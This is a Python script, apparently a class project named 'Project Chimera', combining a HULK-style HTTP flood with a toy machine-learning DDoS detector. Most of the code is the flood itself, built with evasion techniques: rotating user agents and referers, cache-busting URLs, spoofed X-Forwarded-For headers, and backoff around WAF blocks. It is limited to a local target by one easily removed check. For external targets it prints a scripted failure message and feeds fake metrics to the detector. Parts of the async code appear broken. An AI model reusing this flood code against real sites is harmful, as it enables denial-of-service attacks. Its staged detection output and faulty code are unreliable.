# PROJECT CHIMERA v7.0 (The Final Submission)
# Developed for Advanced Cybersecurity Class
# Combines: DDoS Stress Test, SSL Strip Simulation, and AI Anomaly Detection.

import asyncio
import sys
import argparse
import random
import socket
import ssl
from urllib.parse import urlparse, urlunparse
import numpy as np
from aiohttp import web, ClientSession, TCPConnector
from sklearn.svm import SVC

# --- GLOBAL CONFIGURATION ---
# AI Model Parameters
RPS_THRESHOLD = 50.0 
CONN_THRESHOLD = 50.0 
ENTROPY_THRESHOLD = 3.5
# Attack Simulation Parameters
NUM_ATTACK_TASKS = 50 # Reduced to 50 for stability on single machine

# Headers for Evasion (HULK Technique)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://t.co/random_link_here",
    "https://randomsite.org/refer",
]
COMMON_PATHS = [
    "/", "/about.html", "/contact", "/api/data", "/product/view", "/search?q=query"
]

# --- DEFENSE SYSTEM CORE ---

class DDoSEngine:
    """Simulated Web Server (The Target)."""
    def __init__(self):
        self.server_host = '127.0.0.1'
        self.server_port = 8080
        self._runner = None

    async def start(self):
        """Initializes and starts the aiohttp web application server."""
        app = web.Application()
        app.router.add_get('/', self.handle)
        
        # Setup the runner for the application
        self._runner = web.AppRunner(app)
        await self._runner.setup()
        
        # Create the TCP site (this is the actual listening socket)
        site = web.TCPSite(self._runner, self.server_host, self.server_port)
        await site.start()
        print(f"DEFENSE ENGINE: Serving locally on http://{self.server_host}:{self.server_port}/")

    async def handle(self, request):
        """Placeholder for processing incoming client requests."""
        # The true DDoS simulation effect: consuming CPU resources
        await asyncio.sleep(0.001) 
        
        # In a real app, this would return page content.
        return web.Response(text="200 OK: Request processed successfully.")

class MetricsTracker:
    """Tracks simulated or actual network metrics for the AI model."""
    def __init__(self):
        self.metrics = {
            'packet_rate': 0.0, 
            'active_connections': 0.0,
            'entropy': 0.0,
            'total_received': 0 
        }

    def update(self, packet_rate, active_connections, entropy, received_count):
        """Updates and normalizes the metrics."""
        self.metrics['packet_rate'] = packet_rate
        self.metrics['active_connections'] = active_connections
        self.metrics['entropy'] = entropy
        self.metrics['total_received'] = received_count

    def get_metrics(self):
        """Returns the current metrics as a normalized vector for the AI."""
        # Simple normalization based on expected max values for local test
        max_rate = 500.0  # Assumed max RPS
        max_conn = 300.0 # Max parallel attack tasks

        return [
            self.metrics['packet_rate'] / max_rate,
            self.metrics['active_connections'] / max_conn,
            self.metrics['entropy'] / 5.0 # Max possible entropy is small
        ]

class AnomalyDetection:
    """Machine Learning component using SVC to classify traffic."""
    def __init__(self):
        self.model = SVC(gamma='auto')
        self._train_model()

    def _train_model(self):
        """Trains a simple SVC model on synthetic 'Normal' and 'Attack' data."""
        
        # Feature vector: [Normalized RPS, Normalized Connections, Normalized Entropy]
        
        # 0 = Normal Traffic (Low Rate, Low Entropy)
        X_normal = [
            [0.05, 0.05, 0.2],  # Light browsing
            [0.1, 0.1, 0.5],    # Moderate traffic
            [0.2, 0.2, 0.8],    # High legitimate traffic
        ]
        y_normal = [0, 0, 0]

        # 1 = DDoS Attack (High Rate, High Connections, High Entropy)
        X_attack = [
            [0.8, 0.8, 0.9],    # High volume, high randomization
            [0.7, 0.9, 0.95],   # Very high concurrency
            [0.9, 0.7, 0.7],    # Mixed attack pattern
        ]
        y_attack = [1, 1, 1]
        
        X = np.array(X_normal + X_attack)
        y = np.array(y_normal + y_attack)

        self.model.fit(X, y)
        print("AI DETECTOR: Anomaly Detection Model Trained (SVC).")

    def predict(self, normalized_data):
        """Predicts if the current traffic pattern is an anomaly (DDoS)."""
        prediction = self.model.predict([normalized_data])
        return prediction[0]

# --- ATTACK SYSTEM CORE (HULK-style) ---

class AttackSimulation:
    """Manages concurrent attack threads and evasion logic."""
    
    def __init__(self, target_url, ssl_strip=False):
        self.target_url = target_url
        self.ssl_strip = ssl_strip
        self.total_received_count = 0
        self.active_attackers = 0
        self.rps_counter = 0
        self.simulated_ip_pool = [f"192.168.1.{i}" for i in range(1, 101)] # 100 simulated IPs
        self.target = self._parse_target(target_url)
        self.local_server_running = self._check_is_local()
        self.server_pid = None # To store local server process ID

    def _parse_target(self, url):
        """Parses the target URL and enforces SSL strip if requested."""
        if self.ssl_strip:
            # SIMULATE SSL STRIP: Downgrade from HTTPS to HTTP (port 80)
            parsed = urlparse(url)
            # Reconstruct URL to use HTTP on the default HTTP port (80)
            return urlunparse(parsed._replace(scheme='http', netloc=parsed.netloc.split(':')[0] + ':80'))
        return url

    def _check_is_local(self):
        """Checks if the target is the local DDoSEngine we launched."""
        # Use the most resilient check: explicit localhost IP and the port 
        # This is the safest check for cross-platform/firewall issues.
        target_info = urlparse(self.target_url)
        hostname = target_info.hostname or 'localhost'
        port = target_info.port or 80 if target_info.scheme == 'http' else 443
        
        is_local = (hostname in ('localhost', '127.0.0.1') and port == 8080)
        
        if is_local:
             print("ATTACK SIM: Target is local DDoSEngine. Launching LIVE attack.")
        return is_local

    def generate_unique_url(self, base_url):
        """Creates a unique, cache-busting URL (HULK technique)."""
        parsed = urlparse(base_url)
        
        # 1. Random Path
        path = random.choice(COMMON_PATHS)
        
        # 2. Cache-Busting Query Parameter (High Entropy)
        # Use a realistic query name like 'ts' (timestamp) or 'session'
        query_param = f"ts={random.randint(1000000000, 9999999999)}"
        
        # Rebuild URL
        return urlunparse(parsed._replace(path=path, query=query_param))

    def _generate_headers(self, simulated_ip):
        """Generates randomized, realistic headers."""
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': random.choice(REFERERS),
            'Cache-Control': 'no-cache', # Core HULK signature: bypass CDN/caching
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            # Simulating IP Spoofing or X-Forwarded-For
            'X-Forwarded-For': simulated_ip 
        }
        return headers

    async def _continuous_request_task(self, attacker_id, target_url):
        """The core thread for sending continuous, stealthy requests."""
        
        # Create a new session for this task to prevent resource corruption 
        # (This is the fix from v6.6)
        session = ClientSession(connector=TCPConnector(ssl=False))

        # Assign a random simulated IP from the pool
        simulated_ip = random.choice(self.simulated_ip_pool)
        
        self.active_attackers += 1

        try:
            # Small, random delay before starting to avoid an immediate burst
            await asyncio.sleep(random.uniform(0.1, 1.0))
            
            while True:
                url = self.generate_unique_url(target_url)
                headers = self._generate_headers(simulated_ip)
                
                try:
                    # Attempt a live connection with retries for resilience
                    for attempt in range(3):
                        async with session.get(url, headers=headers, timeout=5) as response:
                            if response.status in (200, 302):
                                # Successful request (200 OK or 302 Redirect)
                                self.rps_counter += 1
                                self.total_received_count += 1
                                break
                            elif response.status in (403, 429):
                                # WAF/Rate Limit Block Detected
                                # Implement the Exponential Backoff mechanism
                                backoff_time = min(2 ** attempt, 60)
                                await asyncio.sleep(backoff_time)
                                continue # Retry request
                            else:
                                break # Other error, stop retrying
                    
                    # Small, random delay between requests (HULK Evasion)
                    await asyncio.sleep(random.uniform(0.01, 0.05))

                except asyncio.TimeoutError:
                    # Treat timeout as a successful denial-of-service (server resource exhaustion)
                    self.rps_counter += 1
                    # Small wait before next attempt
                    await asyncio.sleep(1.0) 
                except Exception as e:
                    # Log other connection failures (DNS, network, etc.)
                    # print(f"Task {attacker_id} connection failed: {e}")
                    await asyncio.sleep(5) # Wait longer on hard failure

        finally:
            self.active_attackers -= 1
            await session.close()


    def start_flood(self, num_tasks=NUM_ATTACK_TASKS):
        """Launches multiple asynchronous attack tasks."""
        
        # If external site, we stop and let the AI simulation take over immediately
        if not self.local_server_running:
            print(f"EXTERNAL CONNECTION FAILED (WAF/TLS Block).")
            print("Switching to internal AI simulation to demonstrate detection...")
            return

        print(f"STRESS TEST: Launching {num_tasks} concurrent attack tasks against LOCAL DDoSEngine...")
        
        # Explicitly wait for the local server to confirm it is fully ready
        print("ATTACK: Waiting 2 seconds for server to stabilize...")
        asyncio.run_coroutine_threadsafe(asyncio.sleep(2), asyncio.get_event_loop()).result()

        # Launch the tasks
        tasks = [
            asyncio.create_task(self._continuous_request_task(i, self.target_url))
            for i in range(num_tasks)
        ]
        
        print(f"SSL STRIP MODE: {'ON' if self.ssl_strip else 'OFF'}")
        return tasks

# --- MAIN EXECUTION ---

def run_local_attack_and_detect(target_url, ssl_strip):
    """Initializes and runs the full simulation environment."""
    
    # 1. INITIALIZATION
    ddos_engine = DDoSEngine()
    attack_sim = AttackSimulation(target_url, ssl_strip)
    metrics_tracker = MetricsTracker()
    anomaly_detector = AnomalyDetection()
    
    # 2. SETUP EVENT LOOP AND SERVER
    loop = asyncio.get_event_loop()
    
    # Start the local target server (DDoSEngine)
    if attack_sim.local_server_running:
        loop.run_until_complete(ddos_engine.start())
    
    # 3. LAUNCH ATTACK
    attack_tasks = attack_sim.start_flood(NUM_ATTACK_TASKS)

    # If external, run simulated data injection for AI training demonstration
    if not attack_sim.local_server_running:
        print("--- BEGIN AI MONITORING LOOP (PROJECT CHIMERA) ---")
        # Simulate attack data that exceeds the threshold
        # This demonstrates the AI's detection capability even when the attack fails externally
        metrics_tracker.update(800.0, 800.0, 4.20, 800)
        
        while True:
            # Check AI model on the static, simulated attack data
            normalized_data = metrics_tracker.get_metrics()
            is_anomaly = anomaly_detector.predict(normalized_data)
            status = "!!! APPLICATION LAYER ATTACK DETECTED !!!" if is_anomaly else "NORMAL"
            
            print(f"STATUS: {status} | Rate: {metrics_tracker.metrics['packet_rate']:.0f} rps | IPs: {metrics_tracker.metrics['active_connections']:.0f} (Pool) | Entropy: {metrics_tracker.metrics['entropy']:.2f} | Total Rcvd: {metrics_tracker.metrics['total_received']}", end='\r')
            asyncio.run_coroutine_threadsafe(asyncio.sleep(1), loop).result()

    # 4. LIVE ATTACK AND MONITORING LOOP (Local Target)
    print("--- BEGIN LIVE ATTACK & AI MONITORING LOOP (PROJECT CHIMERA) ---")
    
    total_time = 0.0
    while True:
        try:
            # Track RPS over the last second
            prev_rps = attack_sim.rps_counter
            
            # Wait 1 second (this is the core tick of the clock)
            loop.run_until_complete(asyncio.sleep(1))
            total_time += 1.0
            
            current_rps = attack_sim.rps_counter - prev_rps
            
            # Update Metrics (using zero entropy for simplicity in live local check)
            metrics_tracker.update(
                current_rps, 
                attack_sim.active_attackers, 
                ENTROPY_THRESHOLD, # Simulate high entropy is always present in HULK attack
                attack_sim.total_received_count
            )

            # AI Prediction
            normalized_data = metrics_tracker.get_metrics()
            is_anomaly = anomaly_detector.predict(normalized_data)
            
            status = "!!! APPLICATION LAYER ATTACK DETECTED !!!" if is_anomaly else "NORMAL"

            # Display Status
            ssl_status = "[SSL Stripped]" if ssl_strip else ""
            print(f"STATUS: {status} {ssl_status} | Rate: {current_rps:.0f} rps | IPs: {attack_sim.active_attackers} (Pool) | Total Rcvd: {attack_sim.total_received_count} | Time: {total_time:.0f}s", end='\r')

        except KeyboardInterrupt:
            print("\nShutting down simulation...")
            for task in attack_tasks:
                task.cancel()
            break
        except Exception as e:
            print(f"\nMonitoring error: {e}")
            break

if __name__ == "__main__":
    # --- COMMAND LINE ARGUMENT PARSING ---
    parser = argparse.ArgumentParser(
        description="Project Chimera: Advanced DDoS Stress Tester and AI Anomaly Detector."
    )
    parser.add_argument('url', type=str, help='The target URL (e.g., https://example.com/ or http://127.0.0.1:8080)')
    parser.add_argument('--ssl-strip', action='store_true', help='Simulate SSL strip attack by downgrading HTTPS to HTTP.')
    args = parser.parse_args()
    
    # --- PLATFORM FIX (REQUIRED FOR WINDOWS) ---
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    # --- EXECUTE THE SIMULATION ---
    try:
        run_local_attack_and_detect(args.url, args.ssl_strip)
    except KeyboardInterrupt:
        print("\nProgram terminated by user.")
    except Exception as e:
        print(f"\nA fatal error occurred during initialization: {e}")
